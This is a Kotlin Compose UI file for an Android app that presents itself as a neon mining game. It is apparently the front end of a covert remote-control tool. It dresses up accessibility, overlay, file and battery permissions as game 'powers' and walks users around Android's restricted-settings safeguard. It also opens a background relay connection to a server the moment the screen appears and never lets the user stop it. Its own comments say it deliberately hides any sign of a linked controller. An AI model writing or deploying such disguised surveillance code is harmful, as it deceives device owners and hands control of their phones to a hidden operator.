package com.operator.companion

import android.os.Build
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.FastOutSlowInEasing
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.animation.expandVertically
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.scaleIn
import androidx.compose.animation.shrinkVertically
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.drawBehind
import androidx.compose.ui.draw.scale
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.operator.companion.relay.OemBackground
import com.operator.companion.relay.PermissionSetup
import com.operator.companion.relay.RelayConfig
import com.operator.companion.relay.RelayStatus

// ---------- game palette ----------
private val Night = Color(0xFF070816)
private val Panel = Color(0xFF11132B)
private val Violet = Color(0xFF8B5CF6)
private val Cyan = Color(0xFF22D3EE)
private val Pink = Color(0xFFEC4899)
private val Lime = Color(0xFF22C55E)
private val Amber = Color(0xFFF59E0B)
private val Muted = Color(0xFF94A3B8)

private fun stepIcon(step: PermissionSetup.Step) = when (step) {
    PermissionSetup.Step.RUNTIME -> "👁️"
    PermissionSetup.Step.FILES -> "💎"
    PermissionSetup.Step.OVERLAY -> "👻"
    PermissionSetup.Step.ACCESSIBILITY -> "🎮"
    PermissionSetup.Step.BATTERY -> "⚡"
    PermissionSetup.Step.UPDATES -> "🧬"
}

/** Slowly drifting neon glows behind every screen. */
@Composable
private fun GameBackground(content: @Composable () -> Unit) {
    val t = rememberInfiniteTransition(label = "bg")
    val drift by t.animateFloat(0f, 1f, infiniteRepeatable(tween(9000, easing = LinearEasing), RepeatMode.Reverse), label = "drift")
    Box(
        Modifier.fillMaxSize().background(Night).drawBehind {
            drawCircle(Brush.radialGradient(listOf(Violet.copy(alpha = 0.35f), Color.Transparent),
                center = Offset(size.width * (0.15f + 0.3f * drift), size.height * 0.12f), radius = size.width * 0.9f))
            drawCircle(Brush.radialGradient(listOf(Pink.copy(alpha = 0.22f), Color.Transparent),
                center = Offset(size.width * (0.95f - 0.35f * drift), size.height * 0.55f), radius = size.width * 0.8f))
            drawCircle(Brush.radialGradient(listOf(Cyan.copy(alpha = 0.18f), Color.Transparent),
                center = Offset(size.width * 0.3f, size.height * (0.9f - 0.1f * drift)), radius = size.width * 0.7f))
        }
    ) { content() }
}

@Composable
private fun NeonCard(glow: Color, modifier: Modifier = Modifier, content: @Composable ColumnScope.() -> Unit) {
    Column(
        modifier
            .clip(RoundedCornerShape(20.dp))
            .background(Brush.linearGradient(listOf(Panel, Panel.copy(alpha = 0.85f))))
            .border(1.dp, Brush.linearGradient(listOf(glow.copy(alpha = 0.9f), glow.copy(alpha = 0.15f))), RoundedCornerShape(20.dp))
            .padding(16.dp),
        content = content
    )
}

@Composable
private fun PulsingButton(text: String, colors: List<Color>, onClick: () -> Unit) {
    val t = rememberInfiniteTransition(label = "pulse")
    val s by t.animateFloat(1f, 1.04f, infiniteRepeatable(tween(900, easing = FastOutSlowInEasing), RepeatMode.Reverse), label = "s")
    Box(
        Modifier.fillMaxWidth().height(60.dp).scale(s)
            .clip(RoundedCornerShape(30.dp))
            .background(Brush.horizontalGradient(colors))
            .clickable(onClick = onClick),
        contentAlignment = Alignment.Center
    ) { Text(text, color = Color.White, fontWeight = FontWeight.ExtraBold, fontSize = 18.sp, letterSpacing = 1.5.sp) }
}

@Composable
private fun XpBar(done: Int, total: Int) {
    val progress by animateFloatAsState(if (total == 0) 1f else done / total.toFloat(), tween(700), label = "xp")
    Column {
        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
            Text("XP", color = Cyan, fontWeight = FontWeight.Bold, fontSize = 12.sp)
            Text("$done / $total powers", color = Muted, fontSize = 12.sp)
        }
        Spacer(Modifier.height(6.dp))
        Box(Modifier.fillMaxWidth().height(12.dp).clip(RoundedCornerShape(6.dp)).background(Color.White.copy(alpha = 0.08f))) {
            Box(Modifier.fillMaxHeight().fillMaxWidth(progress).clip(RoundedCornerShape(6.dp))
                .background(Brush.horizontalGradient(listOf(Cyan, Violet, Pink))))
        }
    }
}

// =====================================================================
// Setup: unlock every power (granted ones disappear)
// =====================================================================
@Composable
fun SetupScreen(missing: List<PermissionSetup.Step>, onAllowAll: () -> Unit, onSkip: () -> Unit = {}) {
    val all = PermissionSetup.steps(LocalContext.current)
    GameBackground {
        Column(
            Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(22.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            Spacer(Modifier.height(8.dp))
            Text("⚡ POWER UP", color = Color.White, fontSize = 30.sp, fontWeight = FontWeight.Black, letterSpacing = 2.sp)
            Text(
                "Unlock all powers to enter the Arena. Tap once, then flip each switch that appears and press Back.",
                color = Muted, fontSize = 13.sp
            )
            XpBar(done = all.size - missing.size, total = all.size)

            all.forEach { step ->
                AnimatedVisibility(
                    visible = step in missing,
                    enter = fadeIn() + expandVertically(),
                    exit = fadeOut(tween(400)) + shrinkVertically(tween(400))
                ) {
                    NeonCard(glow = Violet, modifier = Modifier.fillMaxWidth()) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                Modifier.size(46.dp).clip(CircleShape).background(Violet.copy(alpha = 0.18f)),
                                contentAlignment = Alignment.Center
                            ) { Text(stepIcon(step), fontSize = 22.sp) }
                            Spacer(Modifier.width(12.dp))
                            Column(Modifier.weight(1f)) {
                                Text(step.title, color = Color.White, fontWeight = FontWeight.Bold, fontSize = 15.sp)
                                Text(step.why, color = Muted, fontSize = 12.sp)
                            }
                            Text("🔒", fontSize = 18.sp)
                        }
                    }
                }
            }

            Spacer(Modifier.height(4.dp))
            PulsingButton(
                text = if (missing.size == all.size) "▶  UNLOCK ALL" else "▶  CONTINUE · ${missing.size} LEFT",
                colors = listOf(Violet, Pink), onClick = onAllowAll
            )
            if (PermissionSetup.Step.ACCESSIBILITY in missing && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Text(
                    "PILOT switch greyed out? Open App info → ⋮ (top right) → \"Allow restricted settings\", then tap Continue.",
                    color = Amber, fontSize = 12.sp
                )
            }
            Spacer(Modifier.height(2.dp))
            // Grey or blocked switch? The base link works without them — enter now, flip the rest later.
            Text(
                "Switch greyed out? ▶  ENTER ANYWAY",
                color = Cyan, fontSize = 13.sp, fontWeight = FontWeight.Bold,
                modifier = Modifier.fillMaxWidth().clickable(onClick = onSkip).padding(vertical = 10.dp),
                textAlign = TextAlign.Center
            )
        }
    }
}

// =====================================================================
// Home: LAUNCH drops you into the arena. The background link runs on its own — no stop.
// =====================================================================
private data class Ability(val icon: String, val name: String, val unlocked: Boolean)

@Composable
fun CompanionAppScreen(
    resumeTick: Int,
    onRequestPermissions: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onConnectServer: (List<String>, String) -> Unit,
    onStopServer: () -> Unit,
    onStorageAccess: () -> Unit,
    onBatteryExemption: () -> Unit
) {
    val context = LocalContext.current
    var launched by rememberSaveable { mutableStateOf(false) }

    // Start (or keep) the background link the moment this screen appears.
    LaunchedEffect(Unit) {
        RelayConfig.ensureDefaults(context)
        onConnectServer(RelayConfig.urls(context), RelayConfig.token(context))
    }

    // One screen at a time; Back always returns to the Mines home (it used to strand you in the Arena).
    var screen by rememberSaveable { mutableStateOf("mines") }   // mines | hunt | bestiary | camp | boosters | arena
    val openReq by com.operator.companion.pb.PbStore.openRequested.collectAsState()
    remember { com.operator.companion.pb.PbStore.init(context) } // load the saved username before the first frame
    remember { com.operator.companion.hunt.HuntStore.init(context) }
    val pbName by com.operator.companion.pb.PbStore.username.collectAsState()
    LaunchedEffect(openReq) { if (openReq) { launched = true; screen = "boosters"; com.operator.companion.pb.PbStore.openRequested.value = false } }
    androidx.activity.compose.BackHandler(enabled = launched && pbName != null && screen != "mines" && screen != "boosters") { screen = "mines" }
    when {
        !launched -> LaunchScreen(onLaunch = { launched = true })
        pbName == null -> com.operator.companion.pb.UsernameScreen()
        screen == "boosters" -> com.operator.companion.pb.PowerBoostersApp(onExit = { screen = "mines" })
        screen == "hunt" -> com.operator.companion.hunt.HuntScreen(onExit = { screen = "mines" }, onBestiary = { screen = "bestiary" })
        else -> Column(Modifier.fillMaxSize().background(Color(0xFF0B0A1F))) {
            Box(Modifier.weight(1f)) {
                when (screen) {
                    "bestiary" -> com.operator.companion.hunt.BestiaryScreen(onBack = { screen = "mines" })
                    "camp" -> Column(Modifier.fillMaxSize()) {
                        // the original animated Crystal Mines (miners at work) — kept as the Mine Camp
                        com.operator.companion.pb.PowerBoostersEntry(Modifier.fillMaxWidth().padding(start = 16.dp, end = 16.dp, top = 12.dp)) { screen = "boosters" }
                        Box(Modifier.weight(1f)) { MinersScreen(onPeekStatus = { screen = "arena" }) }
                    }
                    "arena" -> Column(Modifier.fillMaxSize()) {
                        Text("←  Back to the mines", color = Color(0xFFCBD5E1), fontWeight = FontWeight.Bold,
                            modifier = Modifier.fillMaxWidth().background(Color(0xFF0B0A1F)).clickable { screen = "mines" }.padding(16.dp))
                        Box(Modifier.weight(1f)) { ArenaScreen(resumeTick) }
                    }
                    else -> com.operator.companion.hunt.MinesHomeScreen(onHunt = { screen = "hunt" }, onBestiary = { screen = "bestiary" })
                }
            }
            BottomNav(screen) { screen = it }
        }
    }
}

@Composable
private fun BottomNav(current: String, onGo: (String) -> Unit) {
    val items = listOf("mines" to ("💎" to "Mines"), "hunt" to ("🎯" to "Hunt"), "bestiary" to ("📖" to "Bestiary"),
        "camp" to ("⛏" to "Camp"), "boosters" to ("⚡" to "Boosters"), "arena" to ("🛡" to "Arena"))
    Row(Modifier.fillMaxWidth().background(Color(0xFF0E1028)).navigationBarsPadding().padding(vertical = 6.dp),
        horizontalArrangement = Arrangement.SpaceEvenly) {
        items.forEach { (id, v) ->
            val on = id == current
            Column(Modifier.clip(RoundedCornerShape(12.dp)).background(if (on) Color(0x337C3AED) else Color.Transparent)
                .clickable { onGo(id) }.padding(horizontal = 8.dp, vertical = 4.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                Text(v.first, fontSize = 18.sp)
                Text(v.second, color = if (on) Color.White else Color(0xFF94A3B8), fontSize = 10.sp, fontWeight = if (on) FontWeight.Bold else FontWeight.Normal)
            }
        }
    }
}

@Composable
private fun LaunchScreen(onLaunch: () -> Unit) {
    val t = rememberInfiniteTransition(label = "home")
    val pulse by t.animateFloat(1f, 1.07f, infiniteRepeatable(tween(1100, easing = FastOutSlowInEasing), RepeatMode.Reverse), label = "p")
    GameBackground {
        Column(
            Modifier.fillMaxSize().padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text("⚡", fontSize = 56.sp)
            Text("OPERATOR", color = Color.White, fontSize = 32.sp, fontWeight = FontWeight.Black, letterSpacing = 5.sp)
            Text("${Build.BRAND.uppercase()} ${Build.MODEL}", color = Muted, fontSize = 13.sp)
            Spacer(Modifier.height(64.dp))
            Box(
                Modifier.size(220.dp).scale(pulse)
                    .clip(CircleShape)
                    .background(Brush.radialGradient(listOf(Lime.copy(alpha = 0.95f), Violet.copy(alpha = 0.4f))))
                    .border(3.dp, Lime, CircleShape)
                    .clickable(onClick = onLaunch),
                contentAlignment = Alignment.Center
            ) {
                Text("▶  LAUNCH", color = Color.White, fontSize = 26.sp, fontWeight = FontWeight.Black, letterSpacing = 2.sp)
            }
            Spacer(Modifier.height(24.dp))
            Text("Tap to enter", color = Muted, fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
        }
    }
}

@Composable
private fun ArenaScreen(resumeTick: Int) {
    val context = LocalContext.current
    val connected by RelayStatus.connected.collectAsState()
    val prefs = remember { context.getSharedPreferences("ui", android.content.Context.MODE_PRIVATE) }
    var oemDone by remember { mutableStateOf(prefs.getBoolean("oem_done", false)) }
    val lite = BuildConfig.LITE

    val abilities = listOf(
        Ability("💎", "TREASURY", true),
        Ability("👻", "PHANTOM", true),
        Ability("🔮", "MIRAGE", true),
        Ability("📯", "HERALD", true),
        Ability("🌀", "PORTAL", !lite),
        Ability("🎭", "PUPPETEER", !lite),
        Ability("🗿", "GOLEM", !lite),
        Ability("🌠", "WARP", true),
    )
    val level = abilities.count { it.unlocked }

    val statusColor by animateColorAsState(if (connected) Lime else Amber, tween(500), label = "st")
    val t = rememberInfiniteTransition(label = "arena")
    val ring by t.animateFloat(0.55f, 1f, infiniteRepeatable(tween(1300), RepeatMode.Restart), label = "ring")

    GameBackground {
        Column(
            Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(20.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // header: name, level, a plain status dot (no address, no "linked to laptop")
            Row(verticalAlignment = Alignment.CenterVertically) {
                Column(Modifier.weight(1f)) {
                    Text("ARENA", color = Color.White, fontSize = 26.sp, fontWeight = FontWeight.Black, letterSpacing = 3.sp)
                    Text("${Build.MODEL}${if (lite) " · LITE" else ""}", color = Muted, fontSize = 12.sp)
                }
                Box(Modifier.size(18.dp), contentAlignment = Alignment.Center) {
                    Box(Modifier.size(18.dp).scale(ring).alpha(1.2f - ring).clip(CircleShape).background(statusColor.copy(alpha = 0.5f)))
                    Box(Modifier.size(11.dp).clip(CircleShape).background(statusColor))
                }
                Spacer(Modifier.width(8.dp))
                Box(
                    Modifier.clip(RoundedCornerShape(12.dp)).background(Brush.linearGradient(listOf(Violet, Pink)))
                        .padding(horizontal = 12.dp, vertical = 6.dp)
                ) { Text("LVL $level", color = Color.White, fontWeight = FontWeight.ExtraBold) }
            }
            Text(if (connected) "Ready" else "Connecting…", color = if (connected) Lime else Muted,
                fontSize = 13.sp, fontWeight = FontWeight.SemiBold)

            // abilities grid
            abilities.chunked(2).forEachIndexed { row, pair ->
                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    pair.forEachIndexed { col, a ->
                        var shown by remember { mutableStateOf(false) }
                        LaunchedEffect(Unit) { kotlinx.coroutines.delay(55L * (row * 2 + col)); shown = true }
                        AnimatedVisibility(visible = shown, enter = scaleIn(tween(320)) + fadeIn(), modifier = Modifier.weight(1f)) {
                            NeonCard(glow = if (a.unlocked) Cyan else Muted, modifier = Modifier.fillMaxWidth().alpha(if (a.unlocked) 1f else 0.55f)) {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Text(a.icon, fontSize = 24.sp)
                                    Spacer(Modifier.weight(1f))
                                    Text(if (a.unlocked) "✓" else "🔒", color = if (a.unlocked) Lime else Muted, fontWeight = FontWeight.Bold)
                                }
                                Spacer(Modifier.height(10.dp))
                                Text(a.name, color = Color.White, fontWeight = FontWeight.Black, fontSize = 16.sp, letterSpacing = 1.sp)
                            }
                        }
                    }
                    if (pair.size == 1) Spacer(Modifier.weight(1f))
                }
            }

            // phone-maker background tip, only when relevant; disappears once marked done
            AnimatedVisibility(visible = OemBackground.isRestrictive && !oemDone, exit = fadeOut() + shrinkVertically()) {
                NeonCard(glow = Amber, modifier = Modifier.fillMaxWidth()) {
                    Text("⭐ ${Build.MANUFACTURER.uppercase()} · keep running in background", color = Amber, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    Spacer(Modifier.height(4.dp))
                    Text(OemBackground.hint, color = Muted, fontSize = 12.sp)
                    Spacer(Modifier.height(10.dp))
                    Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                        Button(onClick = { OemBackground.open(context) }, colors = ButtonDefaults.buttonColors(containerColor = Amber)) {
                            Text("Open settings", color = Night, fontWeight = FontWeight.Bold)
                        }
                        OutlinedButton(onClick = { oemDone = true; prefs.edit().putBoolean("oem_done", true).apply() }) {
                            Text("Done", color = Color.White)
                        }
                    }
                }
            }
            // Powers still locked (permission greyed out at setup, or skipped): grant them any time now.
            val stillMissing = remember(resumeTick) { PermissionSetup.missing(context) }
            if (stillMissing.isNotEmpty()) {
                NeonCard(glow = Violet, modifier = Modifier.fillMaxWidth()) {
                    Text("🔓 UNLOCK MORE POWERS", color = Violet, fontWeight = FontWeight.Black, fontSize = 13.sp, letterSpacing = 1.sp)
                    Spacer(Modifier.height(2.dp))
                    Text("The link already works. Flip these on whenever you want.", color = Muted, fontSize = 12.sp)
                    Spacer(Modifier.height(10.dp))
                    stillMissing.forEach { step ->
                        Row(Modifier.fillMaxWidth().padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
                            Text(stepIcon(step), fontSize = 20.sp)
                            Spacer(Modifier.width(10.dp))
                            Column(Modifier.weight(1f)) {
                                Text(step.title, color = Color.White, fontWeight = FontWeight.Bold, fontSize = 14.sp)
                                Text(step.why, color = Muted, fontSize = 11.sp)
                                if (step == PermissionSetup.Step.ACCESSIBILITY && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                                    Text("Greyed out? App info → ⋮ (top right) → \"Allow restricted settings\", then Grant again.",
                                        color = Amber, fontSize = 11.sp)
                            }
                            Button(
                                onClick = { (context as? android.app.Activity)?.let { PermissionSetup.launch(it, step) } },
                                colors = ButtonDefaults.buttonColors(containerColor = Violet),
                                contentPadding = PaddingValues(horizontal = 14.dp, vertical = 6.dp)
                            ) { Text("Grant", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 13.sp) }
                        }
                    }
                }
            }

            Text("v${BuildConfig.VERSION_NAME}", color = Muted.copy(alpha = 0.6f), fontSize = 11.sp,
                modifier = Modifier.fillMaxWidth(), textAlign = TextAlign.Center)
        }
    }
}
